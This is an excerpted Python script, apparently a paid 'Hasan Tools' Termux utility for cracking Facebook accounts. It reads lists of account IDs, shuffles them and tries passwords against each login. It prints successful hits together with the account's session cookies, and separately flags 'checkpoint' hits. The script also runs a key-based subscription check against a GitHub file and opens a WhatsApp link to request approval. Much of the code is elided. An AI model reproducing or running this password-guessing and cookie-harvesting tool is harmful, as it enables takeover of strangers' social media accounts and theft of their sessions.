...
def uaku():
	try:
		ua=open('Apr.txt','r').read().splitlines()
		for ub in ua:
			ugen.append(ub)
	except:
		a=requests.get('https://github.com/TechnicalHasanBhai/Apr/blob/main/Apr.txt').text
		ua=open('.Apr.txt','w')
...
os.system('espeak -a 300 " Tipe,  Your,   Real,  Name,"')
NameX =input('\033[1;97m[\033[1;92m•\033[1;97m]\033[1;92m WHAT IS YOUR NAME \033[1;91m:\33[1;32m')
os.system('espeak -a 300 " Welcome,   to,  Hasan,  Tools"')
os.system('xdg-open https://https://facebook.com/groups/1094033011587184/')
def banner():
	os.system("clear")
	print (f"""
...
╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
║\33[0;41m            [ WORKING- ONLY DATA ]           \033[0;92m║
╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
\033[0;94m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗\033[1;33m 
╠══[Author                   • \33[1;38mMR-HASAN ]\33[1;38m     ║\033[1;31m 
╠══[Facebook                 • HASAN AHMED]   ║ \033[1;97m  
╠══[Github                   • \33[1;38mHASAN BHAI]    ║\33[1;34m   
╠══[Whatsapp                 • 01971636L7908] ║\33[1;35m 
╠══[TOOLS                    • Paid  ]        ║ \33[1;32m   
...
def login():
	...
	if TUTUL in ['m']:
		...
		os.system('xdg-open https://wa.me/+8801971637908')
	elif TUTUL in ['0']:
...
def result():
	...
	if kz in ['1','01']:
		...
		try:vin = os.listdir('OK')
			...
			os.system('espeak -a 300 " file, not , found,"')
			print('File Not Found ')
			time.sleep(2)
			back()
		if len(vin)==0:
...
def crack_file():
	...
	print('\033[1;32m[ Put File Example:  /sdcard/HASAN.txt  Etc...]')
...
def setting():
	...
	if hu in ['1','01']:
		...
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	print('\x1b[1;92m LOGINY\n\x1b[1;97m [1] METHOD ')
	os.system('espeak -a 300 " 1,  method, choose"')
	hc = input(' CHOOSE: ')
	if hc in ['1','01']:
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				#hasan bhai
				print(f'\r\033[0;94m[{time.strftime("%H:%M")}•HASAN-Cp] {idf} • {pw}')     
				...
				#hasan bhai
				print(f'\r\033[0;92m[{time.strftime("%H:%M")}•[HASAN]-Ok💚] {idf} • {pw}\n\033[0;93m[🌺]= COOKIES • \033[0;92m{kuki} ')
				print('\033[0;94m==============================================================')
				os.system('espeak -a 300 " HASAN, Ok,  id"')
...
if __name__=='__main__':
	...
	try:os.system('touch Apr.txt')
	except:pass

def Subscraption():
	key1=open('/storage/emulated/0/android8.txt', 'r').read()
	r1=requests.get("https://github.com/TechnicalHasanBhai/Apr/blob/main/Apr.txt").text
	if key1 in r1:
		os.system('clear')
		login()
	else:
		...
		print("\033[97;1m[\033[92;1m•\033[97;1m]\33[0;92m Your Key  :\033[0;93m "+ak+Hasan+key1)
		...
		time.sleep(3.5)
		tks = 'Assalamu%20Alaikum-!💚,%20Please%20Approved%20My%20Key%20To%20Premium%20%20Thanks%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20Name%20:%20'+name+'%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20%20Key%20%20:%20'+ak+Hasan+''+key1
